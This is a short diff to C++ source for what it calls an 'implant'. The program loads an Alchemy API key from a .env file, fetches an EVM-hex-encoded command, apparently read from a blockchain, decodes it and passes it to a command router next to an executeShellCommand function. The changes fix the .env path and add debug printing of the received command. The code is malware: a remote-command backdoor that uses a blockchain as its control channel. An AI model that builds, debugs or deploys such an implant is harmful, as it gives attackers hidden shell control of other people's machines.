@@ -89,7 +89,7 @@ std::string executeShellCommand(const std::string& command) {
 int main() {
     std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;
 
-    std::string apiKey = getEnvVar("../hub/.env", "ALCHEMY_API_KEY");
+    std::string apiKey = getEnvVar("../../hub/.env", "ALCHEMY_API_KEY");
     if (apiKey.empty()) {
         std::cout << "[-] FATAL: Could not locate ALCHEMY_API_KEY" << std::endl;
         return 1;
@@ -108,6 +108,8 @@ int main() {
     
     // Convert EVM Hex to clean ASCII string
     std::string command = decodeEVMString(rawHex);
+    std::cout << "Below is the command recieved\n";
+    std::cout << command + "\n";
 
     // The Dynamic Router
     if (command.empty()) {
